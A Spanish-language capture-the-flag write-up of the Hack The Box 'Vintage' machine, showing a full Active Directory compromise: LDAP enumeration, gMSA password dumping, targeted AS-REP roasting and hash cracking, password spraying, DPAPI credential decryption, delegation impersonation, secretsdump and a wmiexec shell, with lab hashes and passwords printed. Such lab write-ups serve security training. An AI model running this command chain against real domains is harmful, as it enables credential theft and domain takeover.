As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123

# Enumeration

>Realizamos un escaneo de puertos TCP de la máquina víctima empleando mi script de escaneo automático:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.231.205
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49676,49687,51079,65153
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-17 10:17:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
51079/tcp open  msrpc         Microsoft Windows RPC
65153/tcp open  msrpc         Microsoft Windows RPC
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-17T10:17:49
|_  start_date: N/A
|_clock-skew: 1m18s
```

>Enumeramos la versión de Windows y el nombre de dominio, aunque no parece funcionar:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.231.205 2>/dev/null 
SMB         10.129.231.205  445    10.129.231.205   [*]  x64 (name:10.129.231.205) (domain:10.129.231.205) (signing:True) (SMBv1:False)
```

>Probamos las credenciales mediante autenticación NTLM por SMB:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.231.205 -u 'P.Rosa' -p 'Rosaisbest123'                              
SMB         10.129.231.205  445    10.129.231.205   [*]  x64 (name:10.129.231.205) (domain:10.129.231.205) (signing:True) (SMBv1:False)
SMB         10.129.231.205  445    10.129.231.205   [-] 10.129.231.205\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

>Aquí nos damos cuenta que la autenticación de NTLM está deshabilitada, haciendo que herramientas como cme, smbclient, rpcclient o ldapdomaindump fallen.

>Vamos a enumerar mediante consultas ldap los usuarios del dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ ldapsearch -x -H ldap://vintage.htb -D "vintage\P.Rosa" -w Rosaisbest123 -b "dc=vintage,dc=htb" "(objectclass=user)" sAMAccountName | grep sAMAccountName | awk -F ":" '{print $2}' | sed 's/ //'
sAMAccountName 
Administrator
Guest
DC01$
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

>Al tratar de hacer un asreproast vemos que ningún usuario tiene la preautenticación de kerberos deshabilitada

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-GetNPUsers -no-pass -usersfile valid_users vintage.htb/ 2>/dev/null 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

>Configuramos el /etc/krb5.conf

```bash
[libdefaults]
  default_realm = vintage.htb

[realms]
  VINTAGE.HTB = {
    kdc = DC01.VINTAGE.HTB:88
    admin_serve = DC01.VINTAGE.HTB
    default_domain = VINTAGE.HTB
  }

[domain_realm]
    .vintage.htb = vintage.htb
    vintage.htb = vintage.htb
```

>Pedimos el TGS del usuario P.Rosa:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ kinit P.Rosa@VINTAGE.HTB 
Password for P.Rosa@VINTAGE.HTB: 
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ klist                   
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: P.Rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
04/17/2025 07:10:47  04/17/2025 17:10:47  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 04/18/2025 07:10:38

```

>Iniciamos el collector bloodhound-python empleando autenticación por kerberos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodhound-python -u P.Rosa -k -no-pass -ns 10.129.231.205 -d vintage.htb -c all       
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The DNS query name does not exist: FS01.vintage.htb.
INFO: Done in 00M 13S
```

>Encendemos la base de datos neo4j:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ sudo neo4j start          
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:38250). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

>Abrimos bloodhound e importamos los datos del collector:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodhound &>/dev/null & disown                                                 
[1] 38611
```

>Aquí vemos que FS01 puede leer las contraseñas GMSA de GMSA01$

![image](https://github.com/user-attachments/assets/17b10ef8-f258-4223-a612-ad03ec299750)

>Para aprovecharnos de esto, vamos a intentar obtener el TGT de FS01$ empleando su nombre como contraseña:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-getTGT -dc-ip 10.129.231.205 vintage.htb/fs01$:fs01
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fs01$.ccache
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ export KRB5CCNAME=fs01$.ccache
```

>Ahora vamos a dumpear la contraseña de GMSA01$ empleando BloodyAD:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb --dc-ip 10.129.231.205 get object GMSA01\$ --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHWm2Hl39sN8YUq3hoDfBcLp6S6QcJOnXZ426tWrk0ztluGpZlr3eWU9i6Uwgkaxkvb1ebvy6afUR+mRvtftwY1Vnr5IBKQyLT6ne3BEfEXR5P5iBy2z8brRd3lBHsDrKHNsM+Yd/OOlHS/e1gMiDkEKqZ4dyEakGx5TYviQxGH52ltp1KqT+Ls862fRRlEzwN03oCzkLYg24jvJW/2eK0aXceMgol7J4sFBY0/zAPwEJUg1PZsaqV43xWUrVl79xfcSbyeYKL0e8bKhdxNzdxPlsBcLbFmrdRdlKvE3WQ==

```

>Vamos a obtener el TGT del usuario empleando su hash NTLM:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-getTGT -dc-ip 10.129.231.205 vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in GMSA01$.ccache
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ export KRB5CCNAME=GMSA01\$.ccache 
```

>Vemos que este usuario tiene privilegios de AddSelf y GenericWrite sobre el grupo ServiceManagers

![image](https://github.com/user-attachments/assets/5b22a0c4-e38c-4072-af1f-538ef660996a)

>Esto vamos a abusarlo de la siguiente manera para agregar al usuario al grupo SERVICEMANAGERS aprovechandonos del privilegio AddSelf:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb --dc-ip 10.129.231.205 add groupMember SERVICEMANAGERS GMSA01\$
[+] GMSA01$ added to SERVICEMANAGERS
```

>Vemos que este grupo tiene permisos de GenericAll sobre 3 usuarios de servicio:

![image](https://github.com/user-attachments/assets/b3464c48-4f65-4a78-9931-11ae8ab35b9e)

>Volvemos a pedir el TGT por si se nos caducó y vamos a realizar un ataque de ASREPROAST Targeted a la cuenta SVC_SQL, primero la habilitamos ya que está disabled y luego le agregamos la flag DONT_REQ_PREAUTH:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb --dc-ip 10.129.231.205 remove uac SVC_SQL -f ACCOUNTDISABLE      
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb --dc-ip 10.129.231.205 add uac SVC_SQL -f DONT_REQ_PREAUTH   
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQL's userAccountControl

```

>Ahora vamos a obtener su hash:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-GetNPUsers -no-pass -usersfile user vintage.htb/ 2>/dev/null                                                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$svc_sql@VINTAGE.HTB:8ed37f41d70b0243c73492ae533cf76a$404e1f452ec7edb8dc02e29576c192403259d3bdc2368ba75c897ca0e6f6535a6c76f4d79588d9c78e747b4073ea26c61b9ec50ff5ab7c06a659bae805be3f3d1d0298cb174ccf515886c208e509c84d697285ca75deb5feda9c80e1401cae088ca567cb803366a2bf9e0a200b98547b5775976b89d96ecc9f1ef07b2a7f07a80701644b4de1ccc0b58af8ef641ed22091409990094c07eb3f7d47230afc81d05b1387bdb4c10dcfa8217873fb57e68a8d6d51d14f90c7e33fae6e1e8e390b5b9b3f7dbbefc31abba5bdad10e6edf7314a15ccd768d614e729409a46e31abac5d797b4a149721a61ad7b
```

>Ahora crackearemos el hash mediante hashcat empleando la máscara 18200 que corresponde a los hashes KRB5ASREP:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ hashcat -m 18200 asrep_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
<SNIP>
$krb5asrep$23$svc_sql@VINTAGE.HTB:8ed37f41d70b0243c73492ae533cf76a$404e1f452ec7edb8dc02e29576c192403259d3bdc2368ba75c897ca0e6f6535a6c76f4d79588d9c78e747b4073ea26c61b9ec50ff5ab7c06a659bae805be3f3d1d0298cb174ccf515886c208e509c84d697285ca75deb5feda9c80e1401cae088ca567cb803366a2bf9e0a200b98547b5775976b89d96ecc9f1ef07b2a7f07a80701644b4de1ccc0b58af8ef641ed22091409990094c07eb3f7d47230afc81d05b1387bdb4c10dcfa8217873fb57e68a8d6d51d14f90c7e33fae6e1e8e390b5b9b3f7dbbefc31abba5bdad10e6edf7314a15ccd768d614e729409a46e31abac5d797b4a149721a61ad7b:Zer0the0ne
```

>Ahora si realizamos un passwordspray vemos que la contraseña de la cuenta SVC_SQL es reutilizada en otra cuenta:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ kerbrute passwordspray -d vintage.htb --dc 10.129.231.205 valid_users Zer0the0ne

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/17/25 - Ronnie Flathers @ropnop

2025/04/17 07:47:38 >  Using KDC(s):
2025/04/17 07:47:38 >   10.129.231.205:88

2025/04/17 07:47:39 >  [+] VALID LOGIN:  svc_sql@vintage.htb:Zer0the0ne
2025/04/17 07:47:39 >  [+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
2025/04/17 07:47:39 >  Done! Tested 18 logins (2 successes) in 0.323 seconds

```

>Aquí podemos ver que el usuario pertenece al grupo Remote Management Users así que nos puede servir para conectarnos mediante evil-winrm al DC y tener un foothold:

![image](https://github.com/user-attachments/assets/05402b74-4d87-4f13-a6cf-df0cd8ab7577)

>Pedimos su TGT y nos lo añadimos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-getTGT -dc-ip 10.129.231.205 vintage.htb/C.NERI                
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in C.NERI.ccache
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ export KRB5CCNAME=C.NERI.ccache 
```

>Ahora nos conectamos mediante evil-winrm, es necesario poner el FQDN en lugar de la ip en -i y debemos tener el archivo /etc/krb5.conf bien configurado como mostré anteriormente:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents>
```

>Aquí podemos ver la flag user.txt:

```bash
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> ls


    Directory: C:\Users\C.Neri\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/7/2024   1:17 PM           2312 Microsoft Edge.lnk
-ar---         4/17/2025  12:08 PM             34 user.txt
```

# Privilege Escalation

> Vamos a robarnos los blobs y la masterkey de DPAPI para dumpear contraseñas

>Localizamos los blobs y los descargamos en nuestra máquina kali:

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> dir -h c:\users\c.neri\appdata\local\microsoft\credentials


    Directory: C:\users\c.neri\appdata\local\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM          11020 DFBE70A7E5CC19A398EBF1B96859CE5D


*Evil-WinRM* PS C:\Users\C.Neri\Desktop> dir -h c:\users\c.neri\appdata\roaming\microsoft\credentials


    Directory: C:\users\c.neri\appdata\roaming\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6
```

>Lo mismo para las master keys:

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> dir c:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          6/7/2024   1:17 PM                S-1-5-21-4024337825-2033394866-2055507597-1115

*Evil-WinRM* PS C:\Users\C.Neri\Documents> dir -h c:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred

```

>Para poder descargarnos los archivos ocultos deberemos antes eliminarles el atributo de sistema y oculto:

```powershell
*Evil-WinRM* PS C:\Users\C.neri\Desktop> attrib -s -h 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
*Evil-WinRM* PS C:\Users\C.neri\Desktop> ls


    Directory: C:\Users\C.neri\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
```


>Primero, vamos a obtener la key de la master key empleando la contraseña del usuario, el SID y los blobs:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid 'S-1-5-21-4024337825-2033394866-2055507597-1115' -password Zer0The0ne

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)
 
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

>Ahora con la key podemos obtener la contraseña del blob:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

>Ahora tenemos las credenciales `c.neri_adm:Uncr4ck4bl3P4ssW0rd0312`

>Este usuario puede añadirse al grupo DelegatedAdmins gracias al privilegio AddSelf que vamos a explotar:

![image](https://github.com/user-attachments/assets/f08c9c37-77ba-4e44-a89c-fcace5187c7d)

>Pedimos y nos asignamos el TGT del usuario:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-getTGT -dc-ip 10.129.231.205 vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.neri_adm.ccache
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ export KRB5CCNAME=c.neri_adm.ccache 
```

>Al tratar de agregarle al grupo da error pero es debido a que ya pertenece a este así que es más fácil.

>Vemos que en el grupo DELEGATEDADMINS existe otro usuario llamado L.Bianchi_adm

>Ahora vamos a agregar nuestra cuenta de svc_sql al grupo DELEGATEDADMINS para agregarle un SPN y poder impersonar al usuario L.Bianchi_adm solicitando un ST por CIFS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodyAD -d vintage.htb --host dc01.vintage.htb --dc-ip 10.129.231.205 -k add groupMember DELEGATEDADMINS "svc_sql"
[+] svc_sql added to DELEGATEDADMINS
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ bloodyAD -d vintage.htb --host dc01.vintage.htb --dc-ip 10.129.231.205 -u c.neri -p Zer0the0ne -k set object svc_sql servicePrincipalName -v 'cifs/dc01.htb'
[+] svc_sql's servicePrincipalName has been updated

```

>Ahora nos pedimos el TGT de svc_sql y lo importamos a nuestra máquina:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-getTGT -dc-ip 10.129.231.205 'vintage.htb/SVC_SQL:Zer0the0ne'                                                                  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in SVC_SQL.ccache
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ export KRB5CCNAME=SVC_SQL.ccache 
```

>Ahora haremos el request del ST por CIFS y nos importamos el ticket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.129.231.205 -k 'vintage.htb/svc_sql:Zer0the0ne'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating L.BIANCHI_ADM
[*] Requesting S4U2Proxy
[*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
                                                                                                                                                                            
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

>Vemos que el usuario puede hacer DCSync:

![image](https://github.com/user-attachments/assets/23e05a9d-ab03-4ee1-a2f4-6607f2fbcede)

>Así que empleamos la herramienta de impacket secretsdump para mediante autenticación kerberos realizar un ataque DCSync para así obtener los hashes ntlm de todos los usuarios, esto realmente es inutil ya que la autenticación por NTLM está deshabilitada

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-secretsdump -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb632ebd8c7df30094b6cea89cdf372be
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e41bb21e027286b2e6fd41de81bce8db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
```

>Por lo que deberemos ganar una shell impersonando a L.Bianchi_adm empleando wmiexec:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/vintage]
└─$ impacket-wmiexec -k -no-pass vintage.htb/l.bianchi_adm@dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm
```

>Vemos que este usuario pertenece al grupo domain admins así que ya habríamos escalado privilegios en el sistema:

```cmd
C:\>net user l.bianchi_Adm
User name                    L.Bianchi_adm
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/26/2024 1:40:30 PM
Password expires             Never
Password changeable          11/27/2024 1:40:30 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Admins        *DelegatedAdmins      
                             *Domain Users         
The command completed successfully.

```

>Leemos la flag root.txt:

```cmd
C:\>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is B8C0-0CD3

 Directory of C:\Users\Administrator\Desktop

11/14/2024  07:48 PM    <DIR>          .
06/08/2024  03:36 PM    <DIR>          ..
04/17/2025  12:08 PM                34 root.txt
```

